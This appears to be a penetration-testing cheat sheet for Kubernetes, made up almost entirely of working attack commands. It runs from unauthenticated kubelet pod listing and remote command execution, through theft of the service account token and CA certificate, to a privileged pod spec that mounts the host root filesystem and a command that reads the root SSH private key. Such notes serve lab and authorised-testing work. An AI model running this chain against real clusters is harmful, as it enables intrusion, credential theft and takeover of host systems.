# Kubernetes

### Interact with pods

```shellscript
# Extracting pods with kubelet API
curl <https://10.129.10.11:10250/pods> -k | jq .

# Extracting pods with kubectl
kubeletctl -i --server 10.129.10.11 pods

# Scan for available commands in pods
kubeletctl -i --server 10.129.10.11 scan rce

# If we get results from the previous command, we can execute commands 
kubeletctl -i --server 10.129.10.11 exec "<COMMAND>" -p <POD> -c <CONTAINER>
```

### PrivEsc

To gain higher privileges and access the host system, we can utilize a tool called [kubeletctl](https://github.com/cyberark/kubeletctl) to obtain the Kubernetes service account's `token` and `certificate` (`ca.crt`) from the server. To do this, we must provide the server's IP address, namespace, and target pod. In case we get this token and certificate, we can elevate our privileges even more, move horizontally throughout the cluster, or gain access to additional pods and resources.

```shellscript
# Extracting pods with kubectl
kubeletctl -i --server <IP> pods

# Scan for available commands in pods
kubeletctl -i --server <IP> scan rce

# Extract tokens if we have command execution on a pod
kubeletctl -i --server <IP> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p <POD> -c <CONTAINER> | tee -a k8.token

# Extract certificates
kubeletctl --server <IP> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt

# List privs => look for pods [get, create, list]
export token=`cat k8.token`
kubectl --token=$token --certificate-authority=ca.crt --server=https://<IP>:6443 auth can-i --list

# If we have the privs, we can create a new container and mount the root filesystem

# Creat a yaml file 
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true
  
# Create the pod 
kubectl --token=$token --certificate-authority=ca.crt --server=https://<IP>:6443 apply -f privesc.yaml

# Check the pod was created
kubectl --token=$token --certificate-authority=ca.crt --server=https://<IP>:6443 get pods

# We can then execute commands => here we extract the root ssh key
kubeletctl --server <IP> exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
```
